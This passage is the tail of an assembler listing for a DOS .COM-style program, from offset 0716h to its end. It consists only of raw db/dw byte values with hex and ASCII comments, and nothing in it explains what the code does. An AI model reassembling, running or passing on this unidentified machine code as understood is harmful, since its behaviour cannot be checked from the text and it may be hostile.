    dw  0402h           ;00716  0204
    db  87h         ;00718
    db  93h         ;00719
    dw  0C68Ah          ;0071A  8AC6
    dw  30E8h           ;0071C  E830         0
    dw  8AFEh           ;0071E  FE8A
    dw  8104h           ;00720  0481
    db  0FFh            ;00722
    db  "Y"         ;00723  59
    db  03h         ;00724
    db  "s#PM2"         ;00725  7323504D
    dw  8AD2h           ;0072A  D28A
    dw  0D0F0h          ;0072C  F0D0
    db  "l"         ;0072E  6C
    dw  0E8E2h          ;0072F  E2E8
    db  "6"         ;00731  36
    db  0FFh            ;00732
    db  "RW"            ;00733  5257
    dw  0B2E8h          ;00735  E8B2
    dw  0E8FEh          ;00737  FEE8
    db  0B3h            ;00739
    db  00h         ;0073A
    db  "_ZQ"           ;0073B  5F5A51
    dw  2FE8h           ;0073E  E82F         /
    db  0FFh            ;00740
    db  "YX"            ;00741  5958
    dw  0B7E8h          ;00743  E8B7
    db  03h         ;00745
    dw  0ED0Ah          ;00746  0AED
    db  "x"         ;00748  78
    dw  0C04h           ;00749  040C
    db  "@"         ;0074B  40
    dw  0AAAAh          ;0074C  AAAA
    dw  75B0h           ;0074E  B075         u
    db  0AAh            ;00750
    db  "[X"            ;00751  5B58
    db  8Bh         ;00753
    dw  2BC8h           ;00754  C82B         +
    db  0C7h            ;00756
    db  "H"         ;00757  48
    dw  0AAAh           ;00758  AA0A
    dw  78C0h           ;0075A  C078         x
    db  03h         ;0075C
    db  "3"         ;0075D  33
    db  0DBh            ;0075E
    db  0C3h            ;0075F
    dw  0ABE8h          ;00760  E8AB
    db  0FFh            ;00762
    db  "Q"         ;00763  51
    dw  59BAh           ;00764  BA59         Y
    db  05h         ;00766
    db  81h         ;00767
    db  0FFh            ;00768
    db  "Y"         ;00769  59
    db  03h         ;0076A
    db  "sqS"           ;0076B  737153
    db  0B3h            ;0076E
    db  07h         ;0076F
    db  8Bh         ;00770
    db  0D5h            ;00771
    dw  0F0E8h          ;00772  E8F0
    dw  57FEh           ;00774  FE57         W
    db  0BFh            ;00776
    db  "X"         ;00777  58
    db  01h         ;00778
    db  "3"         ;00779  33
    db  0DBh            ;0077A
    db  8Bh         ;0077B
    db  0D7h            ;0077C
    dw  4C8Ah           ;0077D  8A4C         L
    dw  0D0E8h          ;0077F  E8D0
    db  0E9h            ;00781
    dw  739Ch           ;00782  9C73         s
    db  0Ah         ;00784
    db  ":x"            ;00785  3A78
    dw  75F0h           ;00787  F075         u
    db  05h         ;00789
    db  8Dh         ;0078A
    db  "GP"            ;0078B  4750
    db  0FDh            ;0078D
    dw  43AAh           ;0078E  AA43         C
    db  9Dh         ;00790
    db  "u"         ;00791  75
    db  0EDh            ;00792
    db  "G;"            ;00793  473B
    db  0FAh            ;00795
    db  "s$"            ;00796  7324
    db  ":|"            ;00798  3A7C
    db  0E3h            ;0079A
    db  "u"         ;0079B  75
    db  07h         ;0079C
    db  8Bh         ;0079D
    dw  0C6FAh          ;0079E  FAC6
    db  05h         ;007A0
    db  "`"         ;007A1  60
    db  0EBh            ;007A2
    dw  5718h           ;007A3  1857         W
    dw  0FAE8h          ;007A5  E8FA
    dw  24FAh           ;007A7  FA24         $
    db  07h         ;007A9
    dw  9398h           ;007AA  9893
    db  03h         ;007AC
    db  0DFh            ;007AD
    db  ";"         ;007AE  3B
    dw  77DAh           ;007AF  DA77         w
    db  0F3h            ;007B1
    dw  058Ah           ;007B2  8A05
    dw  0786h           ;007B4  8607
    dw  3BAAh           ;007B6  AA3B         ;
    dw  75FAh           ;007B8  FA75         u
    db  0EAh            ;007BA
    db  "_]"            ;007BB  5F5D
    db  8Bh         ;007BD
    db  0CDh            ;007BE
    db  "+"         ;007BF  2B
    db  0CFh            ;007C0
    db  83h         ;007C1
    db  "|"         ;007C2  7C
    dw  00E6h           ;007C3  E600
    db  "t"         ;007C5  74
    dw  8106h           ;007C6  0681
    db  0C1h            ;007C8
    db  "\"         ;007C9  5C
    db  01h         ;007CA
    db  "+"         ;007CB  2B
    db  0CFh            ;007CC
    db  8Bh         ;007CD
    db  "T"         ;007CE  54
    dw  8BECh           ;007CF  EC8B
    dw  03C2h           ;007D1  C203
    db  0D1h            ;007D3
    db  03h         ;007D4
    db  "D"         ;007D5  44
    dw  5BEEh           ;007D6  EE5B         [
    db  83h         ;007D8
    db  "|"         ;007D9  7C
    dw  00EEh           ;007DA  EE00
    db  "u"         ;007DC  75
    dw  8B02h           ;007DD  028B
    dw  0E8C2h          ;007DF  C2E8
    db  05h         ;007E1
    dw  9200h           ;007E2  0092
    db  "Z"         ;007E4  5A
    db  8Bh         ;007E5
    db  "\"         ;007E6  5C
    db  0E4h            ;007E7
    db  "+D"            ;007E8  2B44
    dw  89EAh           ;007EA  EA89
    db  07h         ;007EC
    db  0C3h            ;007ED
    db  "3"         ;007EE  33
    db  0C9h            ;007EF
    dw  29A0h           ;007F0  A029         )
    db  01h         ;007F2
    dw  9398h           ;007F3  9893
    dw  0FEBAh          ;007F5  BAFE
    db  0FFh            ;007F7
    dw  078Ah           ;007F8  8A07
    db  "<"         ;007FA  3C
    db  03h         ;007FB
    db  "t"         ;007FC  74
    dw  3C06h           ;007FD  063C         <
    db  04h         ;007FF
    db  "u!"            ;00800  7521
    db  0F7h            ;00802
    dw  0D0DAh          ;00803  DAD0
    db  0E3h            ;00805
    db  "SC"            ;00806  5343
    dw  04E8h           ;00808  E804
    dw  5B00h           ;0080A  005B         [
    dw  02BAh           ;0080C  BA02
    dw  8A00h           ;0080E  008A
    db  "_!:?u"         ;00810  5F213A3F
    db  0Dh         ;00815
    db  8Bh         ;00816
    db  0F3h            ;00817
    db  03h         ;00818
    db  "P!"            ;00819  5021
    dw  0D20Ah          ;0081B  0AD2
    db  "t"         ;0081D  74
    dw  8904h           ;0081E  0489
    db  "P!I"           ;00820  502149
    db  0C3h            ;00823
    db  "2"         ;00824  32
    db  0FFh            ;00825
    dw  2780h           ;00826  8027         '
    db  7Fh         ;00828
    dw  178Ah           ;00829  8A17
    db  8Bh         ;0082B
    db  0C3h            ;0082C
    dw  0E3D0h          ;0082D  D0E3
    db  8Bh         ;0082F
    db  "_!"            ;00830  5F21
    dw  0FA80h          ;00832  80FA
    db  03h         ;00834
    db  "rPPS"          ;00835  72505053
    dw  0E8E8h          ;00839  E8E8
    db  0FFh            ;0083B
    db  "["         ;0083C  5B
    dw  0DF8Ah          ;0083D  8ADF
    db  "R"         ;0083F  52
    dw  0E1E8h          ;00840  E8E1
    db  0FFh            ;00842
    db  93h         ;00843
    db  "Y["            ;00844  595B
    dw  378Ah           ;00846  8A37         7
    dw  0EE80h          ;00848  80EE
    db  0Dh         ;0084A
    db  "t"         ;0084B  74
    db  05h         ;0084C
    dw  0C680h          ;0084D  80C6
    db  07h         ;0084F
    db  "u"         ;00850  75
    dw  8808h           ;00851  0888
    db  "u"         ;00853  75
    db  03h         ;00854
    dw  7588h           ;00855  8875         u
    dw  0EBF2h          ;00857  F2EB
    db  "$"         ;00859  24
    dw  0FE80h          ;0085A  80FE
    db  05h         ;0085C
    db  "s"         ;0085D  73
    db  1Fh         ;0085E
    dw  0D20Ah          ;0085F  0AD2
    db  "u"         ;00861  75
    db  16h         ;00862
    db  ":U"            ;00863  3A55
    db  0E3h            ;00865
    db  "t"         ;00866  74
    dw  2C16h           ;00867  162C         ,
    dw  240Eh           ;00869  0E24         $
    db  0Fh         ;0086B
    db  "<"         ;0086C  3C
    db  05h         ;0086D
    db  "s"         ;0086E  73
    db  09h         ;0086F
    db  "<"         ;00870  3C
    dw  7302h           ;00871  0273         s
    dw  800Ah           ;00873  0A80
    dw  03FEh           ;00875  FE03
    db  "r"         ;00877  72
    db  05h         ;00878
    dw  7D88h           ;00879  887D         }
    db  0F1h            ;0087B
    dw  80B2h           ;0087C  B280
    dw  0D10Ah          ;0087E  0AD1
    dw  0E280h          ;00880  80E2
    dw  0A80h           ;00882  800A
    db  17h         ;00884
    dw  1788h           ;00885  8817
    db  0C3h            ;00887
    dw  0EE8h           ;00888  E80E
    dw  0E800h          ;0088A  00E8
    dw  0FA14h          ;0088C  14FA
    db  "$"         ;0088E  24
    db  07h         ;0088F
    db  "t"         ;00890  74
    dw  3212h           ;00891  1232         2
    db  0C0h            ;00893
    db  ":D"            ;00894  3A44
    db  03h         ;00896
    db  "t"         ;00897  74
    db  0Bh         ;00898
    dw  06E8h           ;00899  E806
    dw  24FAh           ;0089B  FA24         $
    db  03h         ;0089D
    db  "u"         ;0089E  75
    dw  0B002h          ;0089F  02B0
    db  07h         ;008A1
    db  "4"         ;008A2  34
    dw  9804h           ;008A3  0498
    db  8Bh         ;008A5
    dw  86D8h           ;008A6  D886
    db  "x"         ;008A8  78
    dw  0AF8h           ;008A9  F80A
    db  0FFh            ;008AB
    db  "t"         ;008AC  74
    db  0EBh            ;008AD
    dw  0C3AAh          ;008AE  AAC3
    db  0C7h            ;008B0
    db  "D"         ;008B1  44
    dw  0FF02h          ;008B2  02FF
    dw  3280h           ;008B4  8032         2
    db  0FFh            ;008B6
    dw  078Ah           ;008B7  8A07
    db  "%"         ;008B9  25
    db  7Fh         ;008BA
    dw  0D000h          ;008BB  00D0
    db  0E3h            ;008BD
    dw  00BAh           ;008BE  BA00
    db  0FFh            ;008C0
    db  "Ht"            ;008C1  4874
    db  0EBh            ;008C3
    db  8Ah         ;008C4
    db  "4Ht"           ;008C5  344874
    dw  8BE6h           ;008C8  E68B
    db  "W!x"           ;008CA  572178
    db  0E1h            ;008CD
    db  "PRS"           ;008CE  505253
    dw  0DE8Ah          ;008D1  8ADE
    dw  0DAE8h          ;008D3  E8DA
    db  0FFh            ;008D5
    db  "[YX<"          ;008D6  5B59583C
    db  0Ch         ;008DA
    db  "u@"            ;008DB  7540
    dw  0D20Ah          ;008DD  0AD2
    db  "u"         ;008DF  75
    db  0CEh            ;008E0
    db  ":4t"           ;008E1  3A3474
    db  0CAh            ;008E4
    db  "PQSR"          ;008E5  50515352
    dw  0EE8h           ;008E9  E80E
    dw  5A02h           ;008EB  025A         Z
    db  8Bh         ;008ED
    db  "D"         ;008EE  44
    db  01h         ;008EF
    db  ":"         ;008F0  3A
    dw  75F0h           ;008F1  F075         u
    dw  0A04h           ;008F3  040A
    dw  74E4h           ;008F5  E474         t
    db  05h         ;008F7
    db  0B3h            ;008F8
    db  85h         ;008F9
    dw  0C3E8h          ;008FA  E8C3
    dw  5BFCh           ;008FC  FC5B         [
    dw  75B0h           ;008FE  B075         u
    db  0AAh            ;00900
    db  "Et"            ;00901  4574
    db  13h         ;00903
    db  81h         ;00904
    db  0FFh            ;00905
    db  "Y"         ;00906  59
    db  03h         ;00907
    db  "r"         ;00908  72
    dw  8004h           ;00909  0480
    db  "E"         ;0090B  45
    db  0FFh            ;0090C
    db  "W"         ;0090D  57
    db  8Bh         ;0090E
    db  0C7h            ;0090F
    db  87h         ;00910
    db  "Gc"            ;00911  4763
    db  89h         ;00913
    db  87h         ;00914
    db  0E7h            ;00915
    db  00h         ;00916
    db  "MG"            ;00917  4D47
    db  8Bh         ;00919
    db  0D7h            ;0091A
    db  0EBh            ;0091B
    db  "iPQ"           ;0091C  695051
    dw  0D20Ah          ;0091F  0AD2
    db  "uc:t"          ;00921  75633A74
    db  01h         ;00925
    db  "u^"            ;00926  755E
    dw  448Ah           ;00928  8A44         D
    db  03h         ;0092A
    dw  0C00Ah          ;0092B  0AC0
    db  "x!$"           ;0092D  782124
    db  07h         ;00930
    db  "t"         ;00931  74
    dw  3A08h           ;00932  083A         :
    dw  7404h           ;00934  0474         t
    db  19h         ;00936
    db  "<"         ;00937  3C
    db  03h         ;00938
    db  "r"         ;00939  72
    db  15h         ;0093A
    dw  7580h           ;0093B  8075         u
    dw  02FEh           ;0093D  FE02
    dw  44F6h           ;0093F  F644         D
    db  03h         ;00941
    db  "@t;P"          ;00942  40743B50
    dw  0D80Ch          ;00946  0CD8
    dw  0E08Ah          ;00948  8AE0
    dw  0F7B0h          ;0094A  B0F7
    db  0ABh            ;0094C
    db  "X"         ;0094D  58
    db  0EBh            ;0094E
    db  "0"         ;0094F  30
    dw  4FE8h           ;00950  E84F         O
    db  0F9h            ;00952
    db  0B9h            ;00953
    dw  0008h           ;00954  0800
    db  "P"         ;00956  50
    dw  0C68Ah          ;00957  8AC6
    dw  500Ch           ;00959  0C50         P
    dw  58AAh           ;0095B  AA58         X
    db  0B3h            ;0095D
    dw  0E380h          ;0095E  80E3
    db  "#OI@$"         ;00960  234F4940
    db  07h         ;00965
    dw  8B98h           ;00966  988B
    dw  8AD8h           ;00968  D88A
    db  "`"         ;0096A  60
    dw  0AF8h           ;0096B  F80A
    dw  74E4h           ;0096D  E474         t
    db  0E6h            ;0096F
    db  "Ku"            ;00970  4B75
    db  0Ah         ;00972
    db  "[S2"           ;00973  5B5332
    db  0FFh            ;00976
    dw  278Ah           ;00977  8A27         '
    dw  0E40Ah          ;00979  0AE4
    db  "x"         ;0097B  78
    db  0D9h            ;0097C
    dw  7DE8h           ;0097D  E87D         }
    db  01h         ;0097F
    db  93h         ;00980
    dw  40FEh           ;00981  FE40         @
    dw  8AF8h           ;00983  F88A
    db  0F3h            ;00985
    db  "[R"            ;00986  5B52
    dw  25E8h           ;00988  E825         %
    db  0FFh            ;0098A
    dw  6CE8h           ;0098B  E86C         l
    db  01h         ;0098D
    db  "ZX"            ;0098E  5A58
    dw  44C6h           ;00990  C644         D
    db  03h         ;00992
    dw  3C80h           ;00993  803C         <
    dw  750Ch           ;00995  0C75         u
    dw  8B0Ch           ;00997  0C8B
    dw  8BDAh           ;00999  DA8B
    db  0D7h            ;0099B
    db  "+"         ;0099C  2B
    db  0D3h            ;0099D
    dw  5788h           ;0099E  8857         W
    db  0FFh            ;009A0
    db  0E9h            ;009A1
    dw  0122h           ;009A2  2201        "
    dw  0EC8Ah          ;009A4  8AEC
    db  "P"         ;009A6  50
    dw  0D20Ah          ;009A7  0AD2
    db  "u$"            ;009A9  7524
    dw  0FE80h          ;009AB  80FE
    dw  7580h           ;009AD  8075         u
    dw  2C10h           ;009AF  102C         ,
    db  05h         ;009B1
    db  "<"         ;009B2  3C
    dw  0B004h          ;009B3  04B0
    db  01h         ;009B5
    db  "r"         ;009B6  72
    db  01h         ;009B7
    db  "@"         ;009B8  40
    dw  0F08Ah          ;009B9  8AF0
    dw  580Ch           ;009BB  0C58         X
    dw  0EBAAh          ;009BD  AAEB
    db  0Fh         ;009BF
    dw  0F60Ah          ;009C0  0AF6
    db  "x"         ;009C2  78
    db  0Bh         ;009C3
    db  ":4t"           ;009C4  3A3474
    db  07h         ;009C7
    dw  0DE8Ah          ;009C8  8ADE
    db  "2"         ;009CA  32
    db  0FFh            ;009CB
    dw  48FEh           ;009CC  FE48         H
    dw  58F8h           ;009CE  F858         X
    db  0B3h            ;009D0
    db  0Bh         ;009D1
    db  ","         ;009D2  2C
    db  09h         ;009D3
    db  "t"         ;009D4  74
    db  15h         ;009D5
    db  0B3h            ;009D6
    db  "#Ht"           ;009D7  234874
    dw  0410h           ;009DA  1004
    dw  9806h           ;009DC  0698
    db  "ye"            ;009DE  7965
    db  0B3h            ;009E0
    db  "3@t"           ;009E1  334074
    dw  0B306h          ;009E4  06B3
    db  03h         ;009E6
    db  "z"         ;009E7  7A
    dw  0B302h          ;009E8  02B3
    db  "+"         ;009EA  2B
    dw  448Ah           ;009EB  8A44         D
    db  01h         ;009ED
    dw  0D20Ah          ;009EE  0AD2
    db  "u"         ;009F0  75
    dw  8018h           ;009F1  1880
    dw  87E6h           ;009F3  E687
    dw  0FB80h          ;009F5  80FB
    db  "+u"            ;009F7  2B75
    db  03h         ;009F9
    dw  0CE80h          ;009FA  80CE
    db  "@"         ;009FC  40
    dw  7488h           ;009FD  8874         t
    db  03h         ;009FF
    dw  48E8h           ;00A00  E848         H
    db  0FBh            ;00A02
    db  "sq"            ;00A03  7371
    dw  0C00Ah          ;00A05  0AC0
    db  "t"         ;00A07  74
    db  01h         ;00A08
    db  "E"         ;00A09  45
    dw  0F380h          ;00A0A  80F3
    db  06h         ;00A0C
    db  "RBB"           ;00A0D  524242
    db  83h         ;00A10
    dw  05FAh           ;00A11  FA05
    db  "ZsA"           ;00A13  5A7341
    db  0Bh         ;00A16
    dw  78C0h           ;00A17  C078         x
    dw  8012h           ;00A19  1280
    db  0FBh            ;00A1B
    db  "5u8Bu4"        ;00A1C  35753842
    dw  0F08Ah          ;00A22  8AF0
    dw  02B0h           ;00A24  B002
    db  0B3h            ;00A26
    db  0F7h            ;00A27
    dw  0EB8Ah          ;00A28  8AEB
    db  0EBh            ;00A2A
    dw  0BD4h           ;00A2B  D40B
    dw  79D2h           ;00A2D  D279         y
    db  05h         ;00A2F
    db  0F7h            ;00A30
    dw  80DAh           ;00A31  DA80
    db  0F3h            ;00A33
    db  "("         ;00A34  28
    dw  400Ch           ;00A35  0C40         @
    dw  0FB80h          ;00A37  80FB
    db  05h         ;00A39
    db  "t"         ;00A3A  74
    dw  0C02h           ;00A3B  020C
    dw  0AA08h          ;00A3D  08AA
    db  "Jt4"           ;00A3F  4A7434
    dw  0EBAAh          ;00A42  AAEB
    db  "1"         ;00A44  31
    db  0B1h            ;00A45
    db  04h         ;00A46
    db  "u/"            ;00A47  752F
    dw  0D20Ah          ;00A49  0AD2
    db  "t"         ;00A4B  74
    dw  0B806h          ;00A4C  06B8
    dw  02BAh           ;00A4E  BA02
    dw  92AAh           ;00A50  AA92
    db  0ABh            ;00A52
    db  91h         ;00A53
    db  0EBh            ;00A54
    dw  4AD0h           ;00A55  D04A         J
    dw  0C00Ah          ;00A57  0AC0
    db  "t"         ;00A59  74
    dw  8014h           ;00A5A  1480
    db  0E3h            ;00A5C
    db  "8"         ;00A5D  38
    dw  0C00Ch          ;00A5E  0CC0
    dw  0D80Ah          ;00A60  0AD8
    dw  0C28Ah          ;00A62  8AC2
    dw  3398h           ;00A64  9833         3
    dw  0B0C2h          ;00A66  C2B0
    db  81h         ;00A68
    db  "u"         ;00A69  75
    db  03h         ;00A6A
    dw  83B0h           ;00A6B  B083
    db  0F9h            ;00A6D
    dw  93AAh           ;00A6E  AA93
    dw  92AAh           ;00A70  AA92
    db  0ABh            ;00A72
    db  "s"         ;00A73  73
    db  01h         ;00A74
    db  "O"         ;00A75  4F
    db  0EBh            ;00A76
    db  "KA<"           ;00A77  4B413C
    db  07h         ;00A7A
    db  "t"         ;00A7B  74
    db  0CCh            ;00A7C
    db  "@<"            ;00A7D  403C
    dw  9C04h           ;00A7F  049C
    db  "s"         ;00A81  73
    dw  2C02h           ;00A82  022C         ,
    dw  0A02h           ;00A84  020A
    db  0D2h            ;00A86
    db  "uCP"           ;00A87  754350
    dw  01B0h           ;00A8A  B001
    db  0B3h            ;00A8C
    dw  8A8Ah           ;00A8D  8A8A
    db  0EBh            ;00A8F
    dw  0FE80h          ;00A90  80FE
    db  03h         ;00A92
    db  "t"         ;00A93  74
    db  01h         ;00A94
    db  "C"         ;00A95  43
    dw  04E8h           ;00A96  E804
    db  0FBh            ;00A98
    db  "X"         ;00A99  58
    db  9Dh         ;00A9A
    db  "Pr"            ;00A9B  5072
    dw  0B80Ch          ;00A9D  0CB8
    dw  1F80h           ;00A9F  801F
    dw  6484h           ;00AA1  8464         d
    db  0E3h            ;00AA3
    db  "t"         ;00AA4  74
    dw  0AA04h          ;00AA5  04AA
    dw  0E1B0h          ;00AA7  B0E1
    db  0ABh            ;00AA9
    db  "X"         ;00AAA  58
    db  0B3h            ;00AAB
    db  0D3h            ;00AAC
    dw  01B2h           ;00AAD  B201
    dw  748Ah           ;00AAF  8A74         t
    db  01h         ;00AB1
    dw  0BE8h           ;00AB2  E80B
    db  0FBh            ;00AB4
    dw  8092h           ;00AB5  9280
    db  0FBh            ;00AB7
    db  0C1h            ;00AB8
    db  "t"         ;00AB9  74
    db  07h         ;00ABA
    dw  0E8D0h          ;00ABB  D0E8
    db  "r"         ;00ABD  72
    dw  9304h           ;00ABE  0493
    dw  92AAh           ;00AC0  AA92
    dw  88AAh           ;00AC2  AA88
    db  "l"         ;00AC4  6C
    dw  8A02h           ;00AC5  028A
    db  "t"         ;00AC7  74
    db  01h         ;00AC8
    db  "2"         ;00AC9  32
    dw  0C3D2h          ;00ACA  D2C3
    db  0B3h            ;00ACC
    db  0C1h            ;00ACD
    db  9Dh         ;00ACE
    db  "s"         ;00ACF  73
    db  0Bh         ;00AD0
    dw  0EB8Ah          ;00AD1  8AEB
    dw  0C2F6h          ;00AD3  F6C2
    dw  7408h           ;00AD5  0874         t
    dw  0F604h          ;00AD7  04F6
    dw  34DAh           ;00AD9  DA34         4
    db  01h         ;00ADB
    dw  0E280h          ;00ADC  80E2
    db  0Fh         ;00ADE
    db  "t"         ;00ADF  74
    db  0E5h            ;00AE0
    dw  0FA80h          ;00AE1  80FA
    db  01h         ;00AE3
    db  "t"         ;00AE4  74
    db  05h         ;00AE5
    db  ":d"            ;00AE6  3A64
    db  0E3h            ;00AE8
    db  "t"         ;00AE9  74
    dw  0B3C4h          ;00AEA  C4B3
    db  0D1h            ;00AEC
    dw  0FA80h          ;00AED  80FA
    db  03h         ;00AEF
    db  "r"         ;00AF0  72
    db  0BDh            ;00AF1
    db  "P"         ;00AF2  50
    dw  0B1B0h          ;00AF3  B0B1
    dw  0E28Ah          ;00AF5  8AE2
    db  0ABh            ;00AF7
    db  0EBh            ;00AF8
    dw  8AB0h           ;00AF9  B08A
    db  "D"         ;00AFB  44
    db  01h         ;00AFC
    dw  5098h           ;00AFD  9850         P
    db  81h         ;00AFF
    db  0FFh            ;00B00
    db  "Y"         ;00B01  59
    db  03h         ;00B02
    db  "s"         ;00B03  73
    db  05h         ;00B04
    db  8Bh         ;00B05
    dw  88D8h           ;00B06  D888
    db  "x"         ;00B08  78
    dw  0AF0h           ;00B09  F00A
    dw  75D2h           ;00B0B  D275         u
    db  07h         ;00B0D
    db  0B3h            ;00B0E
    db  8Bh         ;00B0F
    dw  86E8h           ;00B10  E886
    dw  73FAh           ;00B12  FA73         s
    db  05h         ;00B14
    dw  0B80Ch          ;00B15  0CB8
    dw  92AAh           ;00B17  AA92
    db  0ABh            ;00B19
    db  "X"         ;00B1A  58
    db  0C3h            ;00B1B

S00100  ENDS
    END H00100

